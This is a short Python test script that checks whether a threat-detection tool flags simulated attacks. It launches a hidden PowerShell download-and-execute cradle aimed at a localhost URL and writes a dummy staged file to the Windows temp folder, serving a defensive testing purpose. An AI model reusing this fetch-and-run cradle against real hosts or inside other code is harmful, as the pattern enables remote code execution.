#!/usr/bin/env python3
"""
Quick test to verify threat detection is working
"""

import subprocess
import time
import sys

print("=" * 60)
print("🧪 THREAT DETECTION TEST")
print("=" * 60)

# Test 1: Fileless attack pattern
print("\n[TEST 1] Launching fileless attack (PowerShell cradle)...")
cmd1 = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
DETACHED = 0x00000008

try:
    p1 = subprocess.Popen(cmd1, shell=True, creationflags=DETACHED)
    print(f"✅ Launched with PID: {p1.pid}")
    time.sleep(2)
except Exception as e:
    print(f"❌ Failed: {e}")

# Test 2: File staging pattern
print("\n[TEST 2] Launching file staging attack...")
cmd2 = 'cmd.exe /c "echo malicious_payload > %TEMP%\\staged_malware.bin"'

try:
    p2 = subprocess.Popen(cmd2, shell=True, creationflags=DETACHED)
    print(f"✅ Launched with PID: {p2.pid}")
    time.sleep(2)
except Exception as e:
    print(f"❌ Failed: {e}")

print("\n" + "=" * 60)
print("✅ TEST COMPLETE")
print("=" * 60)
print("\nNow go to Defender UI and click '👁️ Watch for Sentry Threats'")
print("You should see these threats appear in the Mission Control log!")
